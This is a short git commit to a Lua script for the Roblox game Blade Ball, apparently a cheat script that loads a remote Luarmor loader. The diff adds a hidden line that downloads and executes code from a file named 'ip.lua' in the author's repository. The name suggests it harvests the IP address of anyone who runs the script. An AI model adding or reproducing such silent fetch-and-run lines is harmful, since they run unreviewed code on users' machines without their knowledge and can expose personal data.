08527a52d4ae1902483b46e713a19398ecb3a809
xielbers <88589081+xielbers@users.noreply.github.com>
2025-07-27 21:01:13 -0300

    Actualizar blade-ball.lua

--- blade-ball.lua
+++ blade-ball.lua
@@ -1,1 +1,5 @@
+_G.script_executed = "blade-ball.lua"
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/xielbers/scripts/main/copy/ip.lua'))()
+
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/7c646003ff6621c4b0faacdfd0ac726d.lua"))()
